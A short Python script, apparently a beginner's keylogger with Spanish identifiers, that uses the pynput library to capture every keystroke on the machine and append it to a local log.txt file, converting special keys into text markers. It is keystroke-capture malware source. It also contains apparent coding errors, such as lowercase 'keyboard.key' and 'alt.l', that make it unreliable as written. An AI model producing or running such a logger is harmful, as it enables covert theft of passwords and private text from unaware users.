from pynput import keyboard

IGNORAR = {
    keyboard.key.shift,
    keyboard.key.shift_r,
    keyboard.key.ctrl_l,
    keyboard.key.ctrl_r,
    keyboard.key.alt_r,
    keyboard.key.alt.l,
    keyboard.key.caps_lock,
    keyboard.key.cmd 
}
def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.key.space:
                f.write(" ")
            elif key == keyboard.key.enter:
                f.write("\n")
            elif key == keyboard.key.tab:
                f.write("\t")
            elif key == keyboard.key.backspace:
                f.write(" ")    
            elif key == keyboard.key.esc:
                f.write(" [ESC]")
            elif key in IGNORAR:
                pass
            else:    
                f.write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


